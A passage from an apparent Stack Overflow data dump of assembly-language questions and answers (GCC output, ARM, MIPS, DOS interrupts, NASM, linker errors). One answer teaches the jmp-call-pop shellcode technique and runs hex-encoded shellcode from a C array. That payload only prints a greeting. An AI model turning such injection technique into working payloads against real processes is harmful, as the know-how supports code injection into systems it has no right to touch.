    movl    8(%ebp), %edx
    movl    12(%ebp), %eax
    movl    16(%ebp), %ecx
    cmpl    %edx, %eax
    jbe .L2
    movl    %edx, %eax
.L2:
    cmpl    %ecx, %eax
    jbe .L3
    movl    %ecx, %eax
.L3:
    popl    %ebp
    ret
    .size   min, .-min
    .ident  ""GCC: (Ubuntu 4.3.3-5ubuntu4) 4.3.3""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>The inlined version is within -O2 optimized code (even my markers mrk = 0xfefefefe, before and after the call to min()) are getting optimized away by gcc, so I couldn't get hold of it.</p>

<p><strong>Update:</strong> I tested the changes suggested by Nils, ephemient, however there's no perceptible performance boost I get by using the assembly versions of min(). However, I get a 12.5% boost by compiling the program with -march=i686, which I guess is because the whole program is getting the benefits of the new faster instructions that gcc is generating with this option. Thanks for your help guys.</p>

<p>P.S. - I used the ruby profiler to measure performance (my C program is a shared library loaded by a ruby program), so I could get time spent only for the top-level C function called by the ruby program, which ends up calling min() down the stack. Please see this <a href=""https://stackoverflow.com/questions/2047211/how-do-you-profile-a-c-shared-library"">question</a>.</p>
","<p>Make sure you are using an appropriate <code>-march</code> setting, first off. GCC defaults to not using any instructions that were not supported on the original i386 - allowing it to use newer instruction sets can make a BIG difference at times! On <code>-march=core2 -O2</code> I get:</p>

<pre><code>min:
    pushl   %ebp
    movl    %esp, %ebp
    movl    8(%ebp), %edx
    movl    12(%ebp), %ecx
    movl    16(%ebp), %eax
    cmpl    %edx, %ecx
    leave
    cmovbe  %ecx, %edx
    cmpl    %eax, %edx
    cmovbe  %edx, %eax
    ret
</code></pre>

<p>The use of cmov here may help you avoid branch delays - and you get it without any inline asm just by passing in <code>-march</code>. When inlined into a larger function this is likely to be even more efficient, possibly just four assembly operations. If you need something faster than this, see if you can get the SSE vector operations to work in the context of your overall algorithm.</p>
","2040087"
"ARM assembly loop","21455","","<pre><code>for (int i = 0; i &lt; 10000; i++)
  a[i] = b[i] + c[i]
</code></pre>

<p>What does the ARM assembly for this high level language look like? </p>

<p>Edit: 
I'm also assuming the base address of A is in R8, the base
address of B is in R9, and the base address of C is in R10
and A,B,C are all int arrays</p>

<p>Much appreciated</p>

<p>I tried:</p>

<pre><code>MOV  R0, #0  ; Init r0 (i = 0)

Loop:

        a[i] = b[i] + c[i]   //How to fix this? 

        ADD  R0, R0, #1 ;Increment it

        CMP  R0, #1000 ;Check the limit

        BLE  Loop  ;Loop if not finished
</code></pre>
","<p>Assuming this high level language doesn't have anything conflicting with C, you can use an arm C compiler to create assembly code from your snippet. For example if you have the following in test.c,</p>

<pre><code>void test() {
        register int i asm(""r0"");
        register int *a asm(""r8"");
        register int *b asm(""r9"");
        register int *c asm(""r10"");

        for (i = 0; i &lt; 10000; i++) {
                a[i] = b[i] + c[i];
        }
}
</code></pre>

<p>you can run</p>

<pre><code>arm-linux-androideabi-gcc -O0 -S test.c
</code></pre>

<p>to create a test.s file, which will contain assembly code for your test function as well as some extra stuff. You can see how your loop got compiled into to assembly below.</p>

<pre><code>&lt;snipped&gt;
.L3:
        mov     r2, r8
        mov     r3, r0
        mov     r3, r3, asl #2
        add     r3, r2, r3
        mov     r1, r9
        mov     r2, r0
        mov     r2, r2, asl #2
        add     r2, r1, r2
        ldr     r1, [r2, #0]
        mov     ip, sl
        mov     r2, r0
        mov     r2, r2, asl #2
        add     r2, ip, r2
        ldr     r2, [r2, #0]
        add     r2, r1, r2
        str     r2, [r3, #0]
        mov     r3, r0
        add     r3, r3, #1
        mov     r0, r3
.L2:
        mov     r2, r0
        ldr     r3, .L5
        cmp     r2, r3
        ble     .L3
        sub     sp, fp, #12
        ldmfd   sp!, {r8, r9, sl, fp}
        bx      lr
&lt;snipped&gt;
</code></pre>

<p>Now the problem with this approach is trusting the compiler generates the optimal code for your study, which might not be always the case but what you'll get is fast answers to your questions like above instead of waiting for people :)</p>

<p>-- extra --</p>

<p>GCC allows you to put variables into certain registers, see <a href=""http://gcc.gnu.org/onlinedocs/gcc/Explicit-Reg-Vars.html"" rel=""noreferrer"">related documentation</a>.</p>

<p>You can get arm instruction cheat sheet <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.qrc0001l/QRC0001_UAL.pdf"" rel=""noreferrer"">here</a>.</p>

<p>Newer versions of GCC creates better arm code as one would expected. Above snipped is generated by version 4.4.3, and I can confirm <a href=""https://launchpad.net/gcc-linaro"" rel=""noreferrer"">Linaro</a>'s 4.7.1 proves my claim. So if you take my approach use the most recent tool chain you can get.</p>
","11982051"
"movw and movt in arm assembly","21367","","<p>I'm having trouble deciphering this block of assembly code. What would the value of r1 be by the end and how would I get there?</p>

<pre><code>3242ba66    f6454118    movw    r1, 0x5c18
3242ba6a        466f    mov     r7, sp
3242ba6c    f6c0415a    movt    r1, 0xc5a
3242ba70    f2460002    movw    r0, 0x6002
3242ba74    f6c0405a    movt    r0, 0xc5a
3242ba78        4479    add     r1, pc
3242ba7a        4478    add     r0, pc
3242ba7c        6809    ldr     r1, [r1, #0]
</code></pre>
","<p><code>movw</code> followed by a <code>movt</code> is a common way to load a 32-bit value into a register.  It's the equivalent of OR-ing those two immediate values together, with the <code>movt</code> being the upper 16-bit.  In this case, <code>r1 = (movt immediate value &lt;&lt; 16) | (movw immediate value))</code>.</p>

<pre><code>3242ba66    f6454118    movw    r1, 0x5c18   // r1 = 0x5c18
3242ba6a        466f    mov     r7, sp
3242ba6c    f6c0415a    movt    r1, 0xc5a    // r1 = (r1 &amp; 0xffff) | (0xc5a &lt;&lt; 16)
3242ba70    f2460002    movw    r0, 0x6002
3242ba74    f6c0405a    movt    r0, 0xc5a
3242ba78        4479    add     r1, pc       // r1 = r1 + pc
3242ba7a        4478    add     r0, pc
3242ba7c        6809    ldr     r1, [r1, #0] // r1 = *(r1 + 0)
</code></pre>
","7800239"
"Getting string input and displaying input with DOS interrupts MASM","21236","","<p>In MASM, I created a buffer variable to hold the user string input from keyboard. I am stuck on how to hold the string input into that buffer variable. I don't have any libraries linked like the irvine ones and want to do this with DOS interrupts. So far I have something along the lines of</p>

<pre><code>            .model small

            .stack 100h

            .data
buff        db  25 dup(0), 10, 13
lbuff       EQU ($ - buff)              ; bytes in a string

            .code
main:
            mov ax, @data
            mov ds, ax              

            mov ah, 0Ah         ; doesn't work
            mov buff, ah        ; doesn't seem right
            int 21h                 


            mov     ax, 4000h       ; display to screen
            mov     bx, 1           
            mov     cx, lbuff           
            mov     dx, OFFSET buff     
            int     21h 

            mov ah, 4ch
            int 21h

            end main
</code></pre>

<p>I assume using 0Ah is correct as it is for reading array of input of buffered characters.</p>
","<p>I made some changes to your code. First, the ""buff"" variable needs the three level format (max number of characters allowed, another byte for the number of characteres entered, and the buffer itself) because that's what service 0AH requires. To use service 0AH I added ""offset buff"" (as Wolfgang said). Here it is:</p>

<pre><code>            .model small

            .stack 100h

            .data

buff        db  26        ;MAX NUMBER OF CHARACTERS ALLOWED (25).
            db  ?         ;NUMBER OF CHARACTERS ENTERED BY USER.
            db  26 dup(0) ;CHARACTERS ENTERED BY USER.

            .code
main:
            mov ax, @data
            mov ds, ax              

;CAPTURE STRING FROM KEYBOARD.                                    
            mov ah, 0Ah ;SERVICE TO CAPTURE STRING FROM KEYBOARD.
            mov dx, offset buff
            int 21h                 

;CHANGE CHR(13) BY '$'.
            mov si, offset buff + 1 ;NUMBER OF CHARACTERS ENTERED.
            mov cl, [ si ] ;MOVE LENGTH TO CL.
            mov ch, 0      ;CLEAR CH TO USE CX. 
            inc cx ;TO REACH CHR(13).
            add si, cx ;NOW SI POINTS TO CHR(13).
            mov al, '$'
            mov [ si ], al ;REPLACE CHR(13) BY '$'.            

;DISPLAY STRING.                   
            mov ah, 9 ;SERVICE TO DISPLAY STRING.
            mov dx, offset buff + 2 ;MUST END WITH '$'.
            int 21h

            mov ah, 4ch
            int 21h

            end main
</code></pre>

<p>When 0AH captures the string from keyboard, it ends with ENTER (character 13), that's why, if you want to capture 25 characters, you must specify 26.</p>

<p>To know how many characters the user entered (length), access the second byte (offset buff + 1). The ENTER is not included, so, if user types 8 characters and ENTER, this second byte will contain the number 8, not 9.</p>

<p>The entered characters start at offset buff + 2, and they end when character 13 appears. We use this to add the length to buff+2 + 1 to replace chr(13) by '$'. Now we can display the string.</p>
","29517960"
"How to print a number in assembly NASM?","21233","","<p>Suppose that I have an integer number in a register, how can I print it? Can you show a simple example code?</p>

<p>I already know how to print a string such as ""hello, world"".</p>

<p>I'm developing on Linux.</p>
","<p>If you're already on Linux, there's no need to do the conversion yourself. Just use <a href=""http://linux.die.net/man/3/printf"">printf</a> instead:</p>

<pre><code>;
; assemble and link with:
; nasm -f elf printf-test.asm &amp;&amp; gcc -m32 -o printf-test printf-test.o
;
section .text
global main
extern printf

main:

  mov eax, 0xDEADBEEF
  push eax
  push message
  call printf
  add esp, 8
  ret

message db ""Register = %08X"", 10, 0
</code></pre>

<p>Note that <code>printf</code> uses the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"">cdecl calling convention</a> so we need to restore the stack pointer afterwards, i.e. add 4 bytes per parameter passed to the function.</p>
","8194407"
"What is the meaning of ""non temporal"" memory accesses in x86","21228","","<p>This is a somewhat low-level question.  In x86 assembly there are two SSE instructions: </p>

<blockquote>
  <p><code>MOVDQA <i><em>xmmi, m128</em></i></code></p>
</blockquote>

<p>and  </p>

<blockquote>
  <p><code>MOVNTDQA <i><em>xmmi, m128</em></i></code></p>
</blockquote>

<p>The IA-32 Software Developer's Manual says that the <em>NT</em> in MOVNTDQA stands for <em>Non-Temporal</em>, and that otherwise it's the same as MOVDQA.</p>

<p>My question is, what does <em>Non-Temporal</em> mean?  </p>
","<p>Non-Temporal SSE instructions (MOVNTI, MOVNTQ, etc.), don't follow the normal cache-coherency rules. Therefore non-temporal stores must be followed by an SFENCE instruction in order for their results to be seen by other processors in a timely fashion.</p>

<p>When data is produced and not (immediately) consumed again, the fact that memory store operations read a full cache line first and then modify the cached data is detrimental to performance. This operation pushes data out of the caches which might be needed again in favor of data which will not be used soon. This is especially true for large data structures, like matrices, which are filled and then used later. Before the last element of the matrix is filled the sheer size evicts the first elements, making caching of the writes ineffective.</p>

<p>For this and similar situations, processors provide support for non-temporal write operations. Non-temporal in this context means the data will not be reused soon, so there is no reason to cache it. These non-temporal write operations do not read a cache line and then modify it; instead, the new content is directly written to memory. </p>

<p>Source: <a href=""http://lwn.net/Articles/255364/"" rel=""noreferrer"">http://lwn.net/Articles/255364/</a></p>
","37092"
"linking problem: i386:x86-64 architecture of input file *.o is incompatible with i386 output","21224","","<p>I got a problem in linking when I moved my osdev to linux where it worked previously on gcc 3.5.* and binutils 2.18 (compiled to output x86_64-elf) running under cygwin.<br/><br/>
Here are the infos:<br/><br/>
<strong>gcc -v</strong><br/></p>

<pre><code>
Using built-in specs.
Target: i686-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Ubuntu/Linaro 4.4.4-14ubuntu5' --with-bugurl=file:///usr/share/doc/gcc-4.4/README.Bugs --enable-languages=c,c++,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-4.4 --enable-shared --enable-multiarch --enable-linker-build-id --with-system-zlib --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --with-gxx-include-dir=/usr/include/c++/4.4 --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-objc-gc --enable-targets=all --disable-werror --with-arch-32=i686 --with-tune=generic --enable-checking=release --build=i686-linux-gnu --host=i686-linux-gnu --target=i686-linux-gnu
Thread model: posix
gcc version 4.4.5 (Ubuntu/Linaro 4.4.4-14ubuntu5) 
</code></pre>

<p><br/>
<br/>
<strong>ld -v</strong><br/><pre>
<code>
GNU ld (GNU Binutils for Ubuntu) 2.20.51-system.20100908<br/>
</code><br/><br/></pre></p>

<p>part of <strong>ld -help</strong><br/>
<pre><code>
....<br/>
ld: supported targets: elf32-i386 a.out-i386-linux pei-i386 elf32-little elf32-big elf64-x86-64 pei-x86-64 elf64-l1om elf64-little elf64-big plugin srec symbolsrec verilog tekhex binary ihex trad-core<br/>
....
</pre></code><br/><br/>
<br/><br/>
<strong>The code:</strong><br/>
<br/>
<strong>main.c</strong><br/><pre>
<code>
void main(){<br/>
    /**some code here**/<br/>
}
</code></pre><br/><br/>
<strong>start.asm</strong><br/><pre>
<code>
[bits 64]<br/>
global start<br/>
extern main<br/>
start:<br/>
call main</code></pre><br/><br/>
<strong>link.ld</strong><br/>
<pre><code>
OUTPUT_FORMAT(elf64-x86-64);<br/>
offset = 0x1000000;<br/>
ENTRY(start);<br/>
SECTIONS{<br/>
    . = offset;<br/>
    .text : AT(ADDR(.text) - offset){<br/>
        _code = .;<br/>
        *(.text)<br/>
        <em>(.rodata</em>)<br/>
        . = ALIGN(4096);}<br/>
   .data : AT(ADDR(.data) - offset){<br/>
        _data = .;<br/>
        *(.data)<br/>
        . = ALIGN(4096);}<br/>
   .bss : AT(ADDR(.bss) - offset){<br/>
       _bss = .;<br/>
       *(.bss)<br/>
       *(COMMON)<br/>
       . = ALIGN(4096);}<br/>
   _end = .;<br/>
   /DISCARD/ :<br/>
   {*(.comment)}<br/>
}</code></pre><br/><br/>
<strong>build.sh</strong><br/>
<pre><code>
nasm -f elf64 -o start.o start.asm<br/>
echo .<br/>
echo .<br/>
echo .<br/>
gcc -m64 -ffreestanding -nostdlib -mno-red-zone -mno-mmx -mno-sse -mno-sse2 -mno-sse3 -mno-3dnow -c -o main.o main.c<br/>
echo .<br/>
echo .<br/>
echo .<br/>
ld -nostdlib -nodefaultlibs -T link.ld -o out.elf start.o main.o<br/>
</code></pre><br/><br><br>
<strong>terminal output</strong><br/>
<pre><code>
.<br/>
.<br/>
.<br/>
.<br/>
.<br/>
.<br/>
ld: i386:x86-64 architecture of input file 'start.o' is incompatible with i386 output
<br/>ld: i386:x86-64 architecture of input file 'main.o' is incompatible with i386 output
</code></pre><br/><br/>
I don't understand why it displays 'incompatible with i386 output' when there's OUTPUT_FORMAT(elf64-x86-64); in my linker script specifying the targeted output..</p>
","<p>Try this:</p>

<pre><code>LDEMULATION=""elf_x86_64""
ld -nostdlib -nodefaultlibs -T link.ld -o out.elf start.o main.o
</code></pre>
","5125043"
"How can objdump emit intel syntax","21177","","<p>How can I tell <code>objdump</code> to emit assembly in Intel Syntax rather than the default AT&amp;T syntax?</p>
","<p>What you're looking for is <code>-M intel</code>. Use it as follows.</p>

<pre><code>objdump -M intel -d program_name
</code></pre>
","10362655"
"Difference between byte ptr and word ptr","21107","","<p>I saw the following question on a test paper,</p>

<h2>Question</h2>

<pre><code>VarM DWORD ABBF01598h
</code></pre>

<p>Give the contents of registers <code>al</code>, <code>bx</code>, and <code>dl</code> after the execution of </p>

<ol>
<li><code>mov al, byte ptr VarM + 1</code></li>
<li><code>mov bx, word ptr VarM + 2</code></li>
<li><code>mov dl, byte ptr VarM + 3</code></li>
</ol>

<p>Now I know word ptr and byte ptr by definitions but I am unable to pickup the concept of them.</p>

<h2>According to me</h2>

<ol>
<li><code>al = b</code></li>
<li><code>bx = 0</code></li>
<li><code>dl = F</code></li>
</ol>

<p>Please help me out in understanding these. Thanks in advance. </p>
","<p>In the cases you're looking at, the <code>byte ptr</code> and <code>word ptr</code> don't accomplish much. While harmless, the assembler already ""knows"" that <code>al</code> and <code>dl</code> are byte-sized, and that <code>bx</code> is word-sized.</p>

<p>You need something like <code>byte ptr</code> when (for example) you move an immediate value to an indirect address:</p>

<pre><code>mov bx, some offset
mov [bx], 1
</code></pre>

<p>This won't normally be allowed -- the assembler has no way to know whether you want the <code>1</code> written into a byte, a word, a double-word, possibly a quad-word, or what. You fix it by using a size specification:</p>

<pre><code>mov byte ptr [bx], 1  ; write 1 into a byte
mov word ptr [bx], 1  ; write 1 into a word
mov dword ptr [bx], 1 ; write 1 into a dword
</code></pre>

<p>You <em>can</em> get the assembler to accept the version without a (direct) size specification:</p>

<pre><code>mov bx, some_offset
assume bx: ptr byte

mov [bx], 1   ; Thanks to the `assume`, this means `byte ptr [bx]`
</code></pre>

<p>Edit: (mostly to reply to @NikolaiNFettisov). Try this quick test:</p>

<pre><code>#include &lt;iostream&gt;

int test() { 
    char bytes[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};

    _asm mov eax, dword ptr bytes + 1
}

int main() {
    std::cout &lt;&lt; std::hex &lt;&lt; test();
    return 0;
}
</code></pre>

<p>The result I get is:</p>

<pre><code>5040302
</code></pre>

<p>Indicating that even though I've told it <code>dword ptr</code>, it's adding only 1 to the address, not 4. Of course, somebody writing a different assembler <em>could</em> do it differently, if they chose.</p>
","10413933"
"What is stack frame in assembly?","20853","","<p>What is the structure of a stack frame and how is it used while calling functions in assembly?</p>
","<p>The x86-32 stack frame is created by executing</p>

<pre><code>function_start:
    push ebp
    mov ebp, esp
</code></pre>

<p>so it's accessible through ebp and looks like</p>

<pre><code>ebp+00 (current_frame) : prev_frame
ebp+04                 : return_address
                         ....
prev_frame             : prev_prev_frame
prev_frame+04          : prev_return_address
</code></pre>

<p>There is some advantages of using ebp for stack frames by assembly instruction design, so arguments and locals usually are accessed using ebp register.</p>
","3699916"
"sorting array in mips (assembly)","20805","","<p>im in a class learning assembly using mips. I am working on sorting an array of numbers and i think that I have the method working correctly, but just a bit of trouble. I do not know how to check when im sorted fully. Im using a pretty rudimentary method for sorting, but that is all that we have learned thus far. Also, i do not know how to output the numbers to check to see if it is sorted. Im used to Java and such so assembly is kinda throwing me for a spin. Here is my code thus far:</p>

<pre><code>    .text
    .globl main
main:       la  $a0, Array             # sets the base address of the array to $a0
loop:       lw  $t0, 0($a0)             # sets $t0 to the current element in array
            lw  $t1, 4($a0)         # sets $t1 to the next element in array
            blt $t1, $t0, swap      # if the following value is greater, swap them
            addi    $a0, $a0, 4     # advance the array to start at the next location from last time
            j   loop                  # jump back to loop so we can compare next two elements

swap:       sw  $t0, 4($a0)         # store the greater numbers contents in the higher position in array (swap)
            sw  $t1, 0($a0)         # store the lesser numbers contents in the lower position in array (swap)
            li  $a0, 0                 # resets the value of $a0 back to zero so we can start from beginning of array
            j   loop                  # jump back to the loop so we can go through and find next swap

            .data

Array:      .word   14, 12, 13, 5, 9, 11, 3, 6, 7, 10, 2, 4, 8, 1 
</code></pre>

<p>thanks for any help guys!</p>
","<p><a href=""http://courses.missouristate.edu/kenvollmar/mars/help/syscallhelp.html"" rel=""nofollow"">This link</a> explains how to print to the screen in a MIPS simulator like <a href=""https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;ved=0CC0QFjAA&amp;url=http://spimsimulator.sourceforge.net/&amp;ei=im9XUsnXE5Lb4APHwIHwCg&amp;usg=AFQjCNGN7AI4es3oD5n4Q8pF2rB2CQ-E_Q&amp;sig2=_pvtl8_O4UgbJQNApuuEDg&amp;bvm=bv.53899372,d.dmg"" rel=""nofollow"">QTSPIM</a> or <a href=""https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;ved=0CCsQFjAA&amp;url=http://courses.missouristate.edu/kenvollmar/mars/&amp;ei=pm9XUu7eEffj4APIhIHoBg&amp;usg=AFQjCNGNWrmeHgY8UzCq6kwpee2tdKLpqw&amp;sig2=iAWY5ctd96PWvs_1-cwMpA&amp;bvm=bv.53899372,d.dmg"" rel=""nofollow"">MARS</a>.</p>

<p>As for the code, there were a few bugs. The line <code>li  $a0, 0</code> is overwriting the work done by the initial <code>la  $a0, Array</code> instruction because the <code>li</code> is setting the base address of your array to 0. Instead, you should move the <code>la</code> instruction into the loop so that <code>$a0</code> is properly reset to the base address of <code>Array</code> after iterating over the entire array, and remove the <code>li</code> instruction. You also will need to add in a condition for when your program has completed the sort. I would suggest the following revisions (tested with SPIM):</p>

<pre><code>main:
    la  $t0, Array      # Copy the base address of your array into $t1
    add $t0, $t0, 40    # 4 bytes per int * 10 ints = 40 bytes                              
outterLoop:             # Used to determine when we are done iterating over the Array
    add $t1, $0, $0     # $t1 holds a flag to determine when the list is sorted
    la  $a0, Array      # Set $a0 to the base address of the Array
innerLoop:                  # The inner loop will iterate over the Array checking if a swap is needed
    lw  $t2, 0($a0)         # sets $t0 to the current element in array
    lw  $t3, 4($a0)         # sets $t1 to the next element in array
    slt $t5, $t2, $t3       # $t5 = 1 if $t0 &lt; $t1
    beq $t5, $0, continue   # if $t5 = 1, then swap them
    add $t1, $0, 1          # if we need to swap, we need to check the list again
    sw  $t2, 4($a0)         # store the greater numbers contents in the higher position in array (swap)
    sw  $t3, 0($a0)         # store the lesser numbers contents in the lower position in array (swap)
continue:
    addi $a0, $a0, 4            # advance the array to start at the next location from last time
    bne  $a0, $t0, innerLoop    # If $a0 != the end of Array, jump back to innerLoop
    bne  $t1, $0, outterLoop    # $t1 = 1, another pass is needed, jump back to outterLoop
</code></pre>

<p>Be sure to check out <a href=""http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html"" rel=""nofollow"">this link</a> for additional examples and explanations on what each MIPS instruction does.</p>
","19310108"
"Linux Shellcode ""Hello, World!""","20769","","<p>I have the following working NASM code:</p>

<pre><code>global _start

section .text

_start:
    mov eax, 0x4
    mov ebx, 0x1
    mov ecx, message
    mov edx, 0xF
    int 0x80

    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

section .data
    message: db ""Hello, World!"", 0dh, 0ah
</code></pre>

<p>which prints ""Hello, World!\n"" to the screen. I also have the following C wrapper which contains the previous NASM object code:</p>

<pre><code>char code[] =
""\xb8\x04\x00\x00\x00""
""\xbb\x01\x00\x00\x00""
""\xb9\x00\x00\x00\x00""
""\xba\x0f\x00\x00\x00""
""\xcd\x80\xb8\x01\x00""
""\x00\x00\xbb\x00\x00""
""\x00\x00\xcd\x80"";

int main(void)
{
    (*(void(*)())code)();
}
</code></pre>

<p>However when I run the code, it seems like the assembler code isn't executed, but the program exits fine. Any ideas?</p>

<p>Thanks</p>
","<p>When you inject this shellcode, you don't know what is at <code>message</code>:</p>

<pre><code>mov ecx, message
</code></pre>

<p>in the injected process, it can be anything but it will not be <code>""Hello world!\r\n""</code> since it is in the data section while you are dumping only the text section. You can see that your shellcode doesn't have <code>""Hello world!\r\n""</code>:</p>

<pre><code>""\xb8\x04\x00\x00\x00""
""\xbb\x01\x00\x00\x00""
""\xb9\x00\x00\x00\x00""
""\xba\x0f\x00\x00\x00""
""\xcd\x80\xb8\x01\x00""
""\x00\x00\xbb\x00\x00""
""\x00\x00\xcd\x80"";
</code></pre>

<p>This is common problem in shellcode development, the way to work around it is this way:</p>

<pre><code>global _start

section .text

_start:
    jmp MESSAGE      ; 1) lets jump to MESSAGE

GOBACK:
    mov eax, 0x4
    mov ebx, 0x1
    pop ecx          ; 3) we are poping into `ecx`, now we have the
                     ; address of ""Hello, World!\r\n"" 
    mov edx, 0xF
    int 0x80

    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is in this case the address 
                      ; of ""Hello, World!\r\n"", is pushed into the stack.
    db ""Hello, World!"", 0dh, 0ah

section .data
</code></pre>

<p>Now dump the text section:</p>

<pre><code>$ nasm -f elf shellcode.asm
$ ld shellcode.o -o shellcode
$ ./shellcode 
Hello, World!
$ objdump -d shellcode

shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 &lt;_start&gt;:
 8048060:   e9 1e 00 00 00   jmp    8048083 &lt;MESSAGE&gt;

08048065 &lt;GOBACK&gt;:
 8048065:   b8 04 00 00 00   mov    $0x4,%eax
 804806a:   bb 01 00 00 00   mov    $0x1,%ebx
 804806f:   59               pop    %ecx
 8048070:   ba 0f 00 00 00   mov    $0xf,%edx
 8048075:   cd 80            int    $0x80
 8048077:   b8 01 00 00 00   mov    $0x1,%eax
 804807c:   bb 00 00 00 00   mov    $0x0,%ebx
 8048081:   cd 80            int    $0x80

08048083 &lt;MESSAGE&gt;:
 8048083:   e8 dd ff ff ff   call   8048065 &lt;GOBACK&gt;
 8048088:   48               dec    %eax                    &lt;-+
 8048089:   65               gs                               |
 804808a:   6c               insb   (%dx),%es:(%edi)          |
 804808b:   6c               insb   (%dx),%es:(%edi)          |
 804808c:   6f               outsl  %ds:(%esi),(%dx)          |
 804808d:   2c 20            sub    $0x20,%al                 |
 804808f:   57               push   %edi                      |
 8048090:   6f               outsl  %ds:(%esi),(%dx)          |
 8048091:   72 6c            jb     80480ff &lt;MESSAGE+0x7c&gt;    |
 8048093:   64               fs                               |
 8048094:   21               .byte 0x21                       |
 8048095:   0d               .byte 0xd                        |
 8048096:   0a               .byte 0xa                      &lt;-+

$
</code></pre>

<p>The lines I marked are our <code>""Hello, World!\r\n""</code> string:</p>

<pre><code>$ printf ""\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a""
Hello, World!

$ 
</code></pre>

<p>So our C wrapper will be:</p>

<pre><code>char code[] = 

    ""\xe9\x1e\x00\x00\x00""  //          jmp    8048083 &lt;MESSAGE&gt;
    ""\xb8\x04\x00\x00\x00""  //          mov    $0x4,%eax
    ""\xbb\x01\x00\x00\x00""  //          mov    $0x1,%ebx
    ""\x59""                  //          pop    %ecx
    ""\xba\x0f\x00\x00\x00""  //          mov    $0xf,%edx
    ""\xcd\x80""              //          int    $0x80
    ""\xb8\x01\x00\x00\x00""  //          mov    $0x1,%eax
    ""\xbb\x00\x00\x00\x00""  //          mov    $0x0,%ebx
    ""\xcd\x80""              //          int    $0x80
    ""\xe8\xdd\xff\xff\xff""  //          call   8048065 &lt;GOBACK&gt;
    ""Hello wolrd!\r\n"";     // OR       ""\x48\x65\x6c\x6c\x6f\x2c\x20\x57""
                            //          ""\x6f\x72\x6c\x64\x21\x0d\x0a""


int main(int argc, char **argv)
{
    (*(void(*)())code)();

    return 0;
}
</code></pre>

<p>Lets test it:</p>

<pre><code>$ gcc test.c -o test
$ ./test 
Hello wolrd!
$ 
</code></pre>

<p>it works.</p>
","15704848"
"Reading a two digit number in assembly and storing it in a variable","20708","","<p>I need to a program in assembly to read a two digit number from the user, store it in a variable and later print it.
I have tried a lot, but could not get through.
Here is my coding.</p>

<pre><code>  .model small
.stack 100h
.data
    msg db ""Enter a number: $""
    msg2 db ""You have entered: $""
    num1 db 0
    num2 db 0
    temp db 0
    ten db 10
    readNum db 0
    t2 db 0
    t1 db 0
.code
    mov ax,@data
    mov ds,ax

    call read
    call endL
    call write


    proc endL
        mov dl,0ah
        mov ah,02h
        int 21h
        ret
    endp

    proc read
        mov dx,offset msg
        mov ah,09h
        int 21h

        mov ah,01h
        int 21h
        mov num1,al

        mul ten
        mov temp,al

        mov dl,temp
        add dl,48
        mov ah,02h
        int 21h

        mov ah,01h
        int 21h
        mov num2,al
        mov dl,num2
        add dl,temp     
        mov readNum,dl
        ret
    endp

    proc write
        mov dx,offset msg2
        mov ah,09h
        int 21h

        mov al,readNum
        mov ah,00
        div ten

        mov t1,ah
        mov t2,al

        mov dl,t1
        add dl,48
        mov ah,02h
        int 21h

        mov dl,t2
        add dl,48
        mov ah,02h
        int 21h
    endp

mov ax,4c00h
int 21h

end 
</code></pre>

<p>According to the above program, if I enter 42, it gives me the entered number as 85.
I could not find the error in my program. Can somebody help me please.</p>
","<p>Check out the following program. I have edited your one. There is a small mistake as already mentioned by Frank Kotler. That is you didn't convert the user input to digit. You have added 48 to the user input. But you have to subtract 48 from it.</p>

<pre><code>.model small
    .stack 100h
    .data
        msg db ""Enter a number: $""
        msg2 db ""You have entered: $""
        num1 db 0
        num2 db 0
        temp db 0
        ten db 10
        readNum db 0
        t2 db 0
        t1 db 0
    .code
        mov ax,@data
        mov ds,ax

        call read
        call endL
        call write


        proc endL
            mov dl,0ah
            mov ah,02h
            int 21h
            ret
        endp

        proc read
            mov dx,offset msg
            mov ah,09h
            int 21h

            mov ah,01h
            int 21h
            sub al,48
            mov num1,al

            mov ah,01h
            int 21h
            sub al,48
            mov num2,al     

            mov al,num1
            mul ten
            add al,num2

            mov readNum,al
            ret
        endp

        proc write
            mov dx,offset msg2
            mov ah,09h
            int 21h

            mov al,readNum
            mov ah,00
            div ten

            mov dl,ah
            mov t2,dl

            mov dl,al
            add dl,48
            mov ah,02h
            int 21h

            mov dl,t2
            add dl,48
            mov ah,02h
            int 21h
        endp

    mov ax,4c00h
    int 21h

    end 
</code></pre>
","16995109"
"movq assembly function","20689","","<p>I was reading some code and was not sure what this line does</p>

<pre><code>movq (%rsp), %rsp
</code></pre>

<p>Thanks</p>
","<p><code>movq</code> (assuming you're talking about x86) is a move of a quadword (64-bit value). This particular instruction:</p>

<pre><code>movq (%rsp), %rsp
</code></pre>

<p>looks very much like code that will walk up through stack frames. This particular instruction grabs the quadword pointed to by the current stack pointer, and loads it into the stack pointer, overwriting it.</p>

<p>By way of example, this code sequence (based on real code, and in Intel rather that AT&amp;T format) will continuously load the stack pointer from its contents until the value 16 bytes beyond it is 0.</p>

<pre><code>576  cmpq    [rsp+0x10],0x0
582  jz      594
588  movq    rsp,[rsp]
592  jmp     576
594  ...
</code></pre>

<p>It's possible it may not be stack-frame walking code but it's be unusual since it would be suborning the stack pointer for something it's not usually used for.</p>

<p>It <em>is</em> unusual in that moving up stack frames usually involves stack pointer and base pointer but that's usually for just going up one level (i.e., a return from a function).</p>

<p>For the sort of code shown above where you want to move up multiple levels, it's probably faster to just use the stack pointer until you get where you need to be, then pop the base pointer off then (calling conventions will often push the current base pointer before changing it, so that a simple pop will recover the old value).</p>
","3852919"
"How to use DIV operation in assembly","20499","","<pre><code>.MODEL SMALL
.STACK 64
.DATA

MSGA DB 13,10,""Input first number: "",""$""
